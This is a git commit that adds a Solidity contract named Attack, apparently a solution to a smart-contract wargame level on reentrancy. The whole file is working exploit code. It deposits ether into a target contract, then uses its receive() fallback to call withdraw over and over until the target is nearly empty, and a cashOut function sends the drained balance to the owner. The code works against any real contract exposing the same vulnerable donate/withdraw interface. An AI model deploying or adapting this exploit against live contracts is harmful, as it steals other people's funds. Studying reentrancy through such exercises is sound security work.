6d830d010e91ef07af3b7fe8c923a6e35781de1f
Hsieh <max870701@gmail.com>
2023-04-13 17:48:32 -0700

    Reentrancy Attack Contract

---
+++ 10_Reentry/Attack.sol
@@ -0,0 +1,53 @@
+//SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.17;
+
+// The interface of the target contract
+interface IReentrance {
+    function donate(address _to) external payable;
+    function withdraw(uint amount) external;
+}
+
+contract Attack {
+    IReentrance victim;
+    address payable owner;
+    error SendFailed();
+
+    // Set the msg.sender as this contract's owner.
+    // And also set the address of the target contract as victim.
+    constructor(address _target) {
+        victim = IReentrance(_target);
+        owner = payable(msg.sender);
+    }
+
+    modifier onlyOwner() {
+        require(owner == msg.sender);
+        _;
+    }
+
+    function attack() external payable {
+        victim.donate{value: msg.value}(address(this));
+        victim.withdraw(msg.value);
+        // You cannot add a selfdestruct statement below.
+        // A selfdestruct statement will cause the transaction being reverted.
+    }
+
+    function cashOut(address payable _to) external payable onlyOwner {
+        // The send method has a gas limit 2300.
+        bool success = _to.send(address(this).balance);
+        if(!success){
+            revert SendFailed();
+        }
+    }
+
+    // receive function only used to receive ETH.
+    // No msg.data allowed.
+    // This function will be triggered when receiving ETH.
+    receive() external payable {
+        uint targetBalance = address(victim).balance;
+
+        if (targetBalance >= 0.001 ether) {
+            victim.withdraw(0.001 ether);
+        }
+    }
+
+}
